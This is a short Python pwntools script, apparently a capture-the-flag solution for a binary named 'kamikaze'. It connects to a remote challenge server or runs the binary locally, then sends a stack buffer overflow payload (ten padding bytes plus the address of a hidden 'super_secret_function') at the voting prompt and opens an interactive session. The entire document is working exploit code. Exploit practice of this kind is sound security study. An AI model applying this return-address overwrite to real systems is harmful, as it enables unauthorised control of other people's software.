#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
# context(log_level="debug", arch="amd64", os="linux")
if debug == 1:
    p = process('./kamikaze')
else:
    p = remote('13.48.67.196', 50000)
addr_super_secret_function = 0x400807

pd = 'a' * 0xa
pd += p64(addr_super_secret_function)
p.sendlineafter('Vote: ', pd)
p.recvuntil('Thanks for voting!\n')
p.interactive()
